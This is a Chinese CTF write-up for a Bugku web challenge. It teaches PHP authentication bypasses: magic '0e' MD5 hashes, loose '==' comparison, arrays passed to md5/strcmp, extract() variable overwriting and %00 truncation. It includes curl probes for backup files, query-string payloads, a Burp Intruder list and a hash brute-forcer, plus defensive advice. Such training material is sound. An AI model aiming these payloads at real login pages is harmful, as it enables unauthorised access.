---
title: Bugku 输入密码 - WEB
date: 2026-10-12 22:56:00
updated: 2026-10-12 22:56:00
description: Bugku 基础 30 题 第 30 题：Bugku 输入密码 - WEB
cover: 
top_img: 
tags:
  - Bugku
  - WEB
  - 基础30题
categories:
  - WriteUp
keywords: Bugku,CTF,WriteUp,WEB
---

## 1. 题目信息
- 平台：Bugku CTF
- 分类：WEB
- 难度：★★☆☆☆
- 题目地址：https://ctf.bugku.com/challenges/detail/id/90.html
- 附件：无（或给了源码）

## 2. 题目描述
页面让你**输入密码**。密码对不对由服务端判断，
而判断逻辑有**弱点**。

## 3. 解题思路（一句话）
PHP 的**弱类型比较（`==`）** 和 **变量覆盖** 是这类题的经典弱点，
先看源码，再针对性构造 payload。

## 4. 详细步骤

### 4.1 第一步：先想办法拿到源码
密码判断这种题，**90% 都要看源码**才能确定打哪个点。按优先级：

```bash
URL="题目地址"

# 备份文件（第 28 题的做法）
for f in index.php.bak index.php~ index.php.txt www.zip www.rar code.zip; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' "$URL/$f")  $f"
done

# 看看有没有提示页
curl -s "$URL/robots.txt"
curl -s "$URL/flag.php"
```

如果给出了源码，直接看 4.2 / 4.3 / 4.4 哪种情况对得上。

---

### 4.2 情况 A：PHP 弱比较绕过（`==` 的坑）

**典型源码：**
```php
<?php
$password = $_GET['password'];
if ($password == "admin123") {      // 注意是 ==，不是 ===
    echo $flag;
}
?>
```
或者：
```php
if (md5($password) == "0e123456789012345678901234567890") {
    echo $flag;
}
```

**原理 —— PHP `==` 的松散比较：**

`==` 会**先转换类型再比较**，导致两个"看起来完全不同"的值被判为相等。

**坑 1：`0e` 开头的 MD5 被当成科学计数法**
`0e123456` 在 PHP 里是**科学计数法**，等于 `0`。
所以两个 MD5 都以 `0e` 开头且后面全是数字的字符串，`==` 比较时**都等于 0，因此相等**！

这个特性影响 `md5()`、`sha1()` 等。经典"魔法哈希"：

| 明文 | MD5 |
|---|---|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536297` |
| `s878926199a` | `0e545993274517709034328855841020` |

**全部都以 `0e` 开头，后面全是数字 → 互相 `==` 都成立。**

**利用 payload：**
```
?password=240610708
```
如果后台是 `if (md5($_GET['password']) == md5($其他东西))`，
把两个参数都设成上面不同的魔法哈希明文，就绕过了。

**Python 验证一下（自己算一遍才记得住）：**
```python
import hashlib
for p in ["240610708", "QNKCDZO", "aabg7XSs", "aabC9RqS", "s878926199a"]:
    h = hashlib.md5(p.encode()).hexdigest()
    print(f"{p:12} -> {h}   是0e开头? {h.startswith('0e') and h[2:].isdigit()}")
```
输出：
```
240610708    -> 0e462097431906509019562988736854   是0e开头? True
QNKCDZO      -> 0e830400451993494058024219903391   是0e开头? True
aabg7XSs     -> 0e087386482136013740957780965295   是0e开头? True
...
```

**坑 2：`数字 == 字符串`**
```php
if ($password == 0) { echo $flag; }     // 输入任意非数字字符串都成立！
```
因为 PHP 5 里 `"abc" == 0` 会先转成 `0 == 0` → `true`。
```
?password=abc
?password[]=1        ← 传数组也行（数组和 0 比较……看版本）
```

**坑 3：`"1abc" == 1`**
```php
if ($password == 1) { ... }     // ?password=1abc 也成立
```

**坑 4：数组绕过**
如果代码是 `if (md5($a) === md5($b))`，MD5 相等但有不同明文很难找。
但如果代码是 **`if ($a == $b)`** 而 `$a`、`$b` 是 `md5()` 的返回值，
可以用**数组**：
```
?a[]=1&b[]=2
```
`md5(数组)` 在旧 PHP 里返回 `null`，`null == null` → `true`（并且会报 Warning）。

> **防御**：永远用 **`===`**（严格比较，类型和值都要一样）。

---

### 4.3 情况 B：变量覆盖（`extract` / `$$`）

**典型源码：**
```php
<?php
extract($_GET);              // ← 把 GET 参数全变成变量！
if ($password === $real_password) {
    echo $flag;
}
?>
```

`extract($_GET)` 会把 `?real_password=xxx` 变成变量 `$real_password`，
于是你就能**覆盖掉程序里原本的变量**。

**利用 payload：**
```
?real_password=xxx&password=xxx
```
或者如果代码是：
```php
$flag = "no flag";
extract($_GET);
if ($password == $flag) { echo $flag; }
```
那就：
```
?password=任意&flag=任意
```

**同理危险函数：**
- `parse_str($query);`（不带第二个参数时）
- `import_request_variables()`
- `$$var`（可变变量）
- `foreach ($_GET as $k=>$v) $$k = $v;`

---

### 4.4 情况 C：哈希长度扩展 / 其他

**① MD5 无法处理数组 → 返回 null**
```
?password[]=
```

**② `strcmp` 绕过**
```php
if (strcmp($_GET['password'], "secret") == 0) { echo $flag; }
```
`strcmp(数组, 字符串)` 会报 Warning 并**返回 NULL**，而 `NULL == 0` 成立！
```
?password[]=1
```

**③ `in_array` 弱比较**
```php
if (in_array($password, ["1", "2", "3"])) { ... }
```
第三个参数没写 `true` 就是弱比较，`?password=1abc` 可能绕过。

**④ `preg_match` 的 `/e` 修饰符（PHP < 7）**
```php
preg_replace('/pattern/e', 'md5($str)', ...)
```
`/e` 会把替换结果**当 PHP 代码执行** → 代码执行漏洞。

**⑤ `ereg`/`preg_match` 的 `%00` 截断**
```
?password=secret%00anything
```

---

### 4.5 第五步：Burp 批量试 payload
把上面的 payload 收集成一个列表，用 **Burp Intruder** 一次跑完：

```
240610708
QNKCDZO
aabg7XSs
aabC9RqS
s878926199a
1abc
abc
0
1
true
admin
password
flag
[]
```

**Intruder 用法：**
1. Burp 拦下请求 → `Ctrl+I` 发到 Intruder
2. `Positions` 里把参数值用 `§` 包起来：`password=§value§`
3. `Payloads` 里粘上面的列表
4. `Start attack`，看**响应长度或状态码不同的那一条**

---

### 4.6 第六步：拿到 flag

## 5. 关键知识点

### 5.1 PHP 弱比较（这是重点，面试必问）
| 表达式 | 结果 | 原因 |
|---|---|---|
| `"0e123" == "0e456"` | `true` | 都被当成科学计数法 = 0 |
| `"abc" == 0` | `true`（PHP 7 及以前） | `"abc"` 转数字为 0 |
| `"1abc" == 1` | `true` | 转数字为 1 |
| `"0" == false` | `true` | 类型转换 |
| `null == false` | `true` | —— |
| `[] == false` | `true` | 空数组为假 |
| `"1" === 1` | `false` | `===` 要求类型相同 |
| `0 === false` | `false` | 同上 |

> ⚠️ **PHP 8 的变化**：`"abc" == 0` 在 PHP 8 中变成 `false`（字符串和数字比较规则改了）。
> 所以这类题**要看靶机的 PHP 版本**。

### 5.2 核心安全原则
1. **加密/哈希比较一律用 `===`**（`hash_equals()` 更好，防时序攻击）
2. **永远不要 `extract($_GET/POST)`** 这种用户输入
3. **`md5()` / `sha1()` 不适合存密码**，用 `password_hash()` + `password_verify()`
4. **`strcmp`、`in_array` 等函数有类型陷阱**，注意第三参数和返回值
5. **输入校验要在服务端做，且做严格的类型和格式校验**

### 5.3 顺带学：怎么找"魔法哈希"
想自己找 `0e` 开头的 MD5？写脚本爆破：
```python
import hashlib, itertools, string

chars = string.ascii_letters + string.digits
found = 0
for length in range(1, 12):
    for tup in itertools.product(chars, repeat=length):
        s = ''.join(tup)
        h = hashlib.md5(s.encode()).hexdigest()
        if h.startswith('0e') and h[2:].isdigit():
            print(s, '->', h)
            found += 1
            if found >= 5:
                raise SystemExit
```
> 这个脚本跑一会儿就能出几个。**知道怎么来的，比背下来强。**

## 6. 常见坑
- **一定要先看源码**，不然你不知道打的是 `==`、`extract` 还是 `strcmp`，
  乱试一通浪费时间。
- **PHP 版本影响结论**：PHP 8 下 `"abc" == 0` 不再成立，靶机版本很重要。
- **`md5(数组)` 会报 Warning 并返回 null**，但如果代码加了 `@` 或者开了严格错误处理，
  可能不返回 null，要实测。
- **提交的 flag 要带 `flag{}`**，别只提交里面那串。

### 6.1 本地搭环境验证（强烈推荐）
```bash
# 装 PHP 后，写个 test.php 本地跑，验证你的 payload
php -S 127.0.0.1:8000

# test.php
<?php
var_dump("0e123" == "0e456");    // bool(true)
var_dump("abc" == 0);            // PHP7: true, PHP8: false
?>
```

## 7. FLAG
```
flag{这里填你提交成功的真实 flag}
```

